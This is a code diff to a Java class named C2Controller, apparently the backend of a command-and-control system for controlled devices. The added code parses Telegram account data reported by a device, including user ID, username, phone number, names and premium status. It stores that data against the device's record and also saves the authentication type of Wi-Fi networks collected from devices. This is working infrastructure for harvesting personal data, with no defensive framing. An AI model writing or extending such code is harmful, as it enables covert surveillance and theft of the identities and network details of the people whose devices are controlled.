@@ -524,6 +524,73 @@ public class C2Controller {
                 if (isDuplicate) {
                     return ResultUtils.success(true);
                 }
+
+                // Handle get_current_user result
+                if ("get_current_user".equals(task.getCommand()) && result != null) {
+                    try {
+                        log.info("Processing current user result for task {}, result: {}", taskId, result);
+                        Map<String, Object> userMap = gson.fromJson(result, new TypeToken<Map<String, Object>>(){}.getType());
+                        
+                        if (userMap != null) {
+                            String userId = (String) userMap.get("userId");
+                            if (StringUtils.isNotBlank(userId)) {
+                                // 1. Update/Insert TgAccount
+                                QueryWrapper<TgAccount> tgQuery = new QueryWrapper<>();
+                                tgQuery.eq("tgId", userId);
+                                TgAccount tgAccount = tgAccountMapper.selectOne(tgQuery);
+                                
+                                if (tgAccount == null) {
+                                    tgAccount = new TgAccount();
+                                    tgAccount.setTgId(userId);
+                                    tgAccount.setCreateTime(new Date());
+                                }
+                                
+                                tgAccount.setUsername((String) userMap.get("username"));
+                                tgAccount.setPhone((String) userMap.get("phone"));
+                                String firstName = (String) userMap.get("firstName");
+                                String lastName = (String) userMap.get("lastName");
+                                tgAccount.setFirstName(firstName);
+                                tgAccount.setLastName(lastName);
+                                
+                                Object isPremiumObj = userMap.get("isPremium");
+                                if (isPremiumObj instanceof Boolean) {
+                                    tgAccount.setIsPremium((Boolean) isPremiumObj ? 1 : 0);
+                                } else if (isPremiumObj instanceof Number) {
+                                     tgAccount.setIsPremium(((Number) isPremiumObj).intValue());
+                                }
+                                
+                                tgAccount.setUpdateTime(new Date());
+                                
+                                // 2. Associate with Device
+                                String deviceUuid = task.getDeviceUuid();
+                                if (deviceUuid == null && payload.containsKey("uuid")) {
+                                    deviceUuid = (String) payload.get("uuid");
+                                }
+                                if (StringUtils.isNotBlank(deviceUuid)) {
+                                    tgAccount.setDeviceUuid(deviceUuid);
+                                    
+                                    // Also update C2Device current_tg_id
+                                    QueryWrapper<C2Device> deviceQuery = new QueryWrapper<>();
+                                    deviceQuery.eq("uuid", deviceUuid);
+                                    C2Device device = c2DeviceMapper.selectOne(deviceQuery);
+                                    if (device != null) {
+                                        device.setCurrentTgId(userId);
+                                        c2DeviceMapper.updateById(device);
+                                    }
+                                }
+                                
+                                if (tgAccount.getId() == null) {
+                                    tgAccountMapper.insert(tgAccount);
+                                } else {
+                                    tgAccountMapper.updateById(tgAccount);
+                                }
+                                log.info("Updated TgAccount for userId: {}", userId);
+                            }
+                        }
+                    } catch (Exception e) {
+                        log.error("Failed to process get_current_user result", e);
+                    }
+                }
                 
                 // If this was a get_software task, update the device's software list
                 if ("get_software".equals(task.getCommand()) && result != null) {
@@ -699,6 +766,13 @@ public class C2Controller {
                                         // Handle signal strength as number or string
                                         Object signal = wifi.get("signal");
                                         c2Wifi.setSignalStrength(signal != null ? String.valueOf(signal) : "");
+                                        
+                                        // Handle authentication
+                                        Object authObj = wifi.get("auth");
+                                        if (authObj != null) {
+                                            c2Wifi.setAuthentication(String.valueOf(authObj));
+                                        }
+                                        
                                         c2Wifi.setCreateTime(new Date());
                                         c2WifiMapper.insert(c2Wifi);
                                         inserted++;
